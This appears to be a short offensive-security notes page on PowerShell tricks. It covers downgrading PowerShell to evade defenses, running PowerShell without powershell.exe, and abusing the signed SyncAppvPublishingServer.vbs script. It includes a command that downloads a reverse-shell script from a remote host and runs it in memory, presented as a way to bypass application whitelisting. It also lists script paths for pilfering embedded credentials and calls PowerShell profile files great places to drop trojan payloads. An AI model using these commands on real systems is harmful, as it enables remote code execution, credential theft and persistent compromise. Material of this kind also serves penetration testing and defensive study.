# 🔧 Powershell Tricks

## <mark style="color:red;">Powershell</mark>

Powershell is a console replacement for windows cmd.exe that takes advantage of the .Net framework and COM objects and has a lot of bash-like features built into it.

Powershell has many interfaces such as the shell interface, script development GUI interface (ISE) and most importantly `System.Management.Automation.dll` which is the main DLL for loading powershell sessions.

#### powershell version 2.0 is common in windows 7 and server 2008 and downgrading from powershell 3 or 5 (latest version) to this one is great way of defense evasion.

## <mark style="color:red;">AMSI Bypass</mark>

#### Check [this section](amsi-bypass.md).

## <mark style="color:red;">Powershell without powershell.exe</mark>

Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it.

If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there are ways to execute powershell still.

```
rundll32.exe PowerShdll.dll,main
```

### <mark style="color:orange;">SyncAppvPublishingServer</mark>

Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```
SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```

example:

#### <mark style="color:green;">getting a reverse shell with SyncAppvPublishingServer and powershell.</mark>

generate a powershell payload and serve it on the network, use this command to call powershell from vba and load the payload in memory.

```
SyncAppvPublishingServer.vbs "Break; iex(new-object system.net.webclient).downloadstring('http://192.168.56.1/rev.ps1')"
```

{% hint style="info" %}
#### This technique can easily bypass application whitelisting.
{% endhint %}



{% embed url="https://youtu.be/7tvfb9poTKg" %}

{% embed url="https://github.com/p3nt4/PowerShdll" %}

{% embed url="https://github.com/mirsys/PSAttack" %}

### <mark style="color:orange;">BYOPS</mark>

#### Bring your own powershell, any application that can use the .Net DLL to execute powershell commands.

{% embed url="https://github.com/leechristensen/UnmanagedPowerShell" %}

{% embed url="https://github.com/bitsadmin/nopowershell" %}

## <mark style="color:red;">Powershell Command Order</mark>

#### when a powershell command is executed, windows will look for the command in this order:

* Doskeys Alias (pre-windows 10 PSConsoleHostReadline)
* Alias
* Function
* Cmdlet
  * overloaded cmdlet checks object type
* Executable
  * tries each $PATHEXT for each directory in $PATH

## <mark style="color:red;">Attacking Resources</mark>

Pilfer embedded credentials in scripts:

```
C:\scripts
$HOME\Documents\WindowsPowerShell
C:\users\username\Documents\WindowsPowerShell\
$PSHOME\
c:\windows\system32\WindowsPowerShell\v1.0\
```

## <mark style="color:red;">Powershell Autoruns</mark>

The PowerShell console and ISE have different defaults for a profile. The profile is loaded every time PowerShell starts. This can be specific to the Host, User, Console, ISE, or a combination thereof. The filename of the current profile is always stored at $PROFILE. Any statements, including legacy commands or cmdlets in this file, will be executed upon start of PowerShell. You may want to adjust your profile to load certain modules or preset some environment variables.&#x20;

#### Because these files are automatically loaded when starting PowerShell, they are great locations to drop trojan payloads!

Profile running locations and context:

| Description          | Tool    | Path                                                                    |
| -------------------- | ------- | ----------------------------------------------------------------------- |
| Current User +Host   | Console | $Home\Documents\WindowsPowerShell\Profile.ps1                           |
| Current User         | Console | $Home\Documents\Profile.ps1                                             |
| Current Host         | Console | $PsHome\Microsoft.PowerShell\_profile.ps1                               |
| All Users, All Hosts | Console | $PsHome\Profile.ps1                                                     |
| Current User + Host  | ISE     | $Home\Documents\WindowsPowerShell\Microsoft.Power ShellISE\_profile.ps1 |
| Current Host         | ISE     | $PsHome\Microsoft.PowerShellISE\_profile.ps1                            |

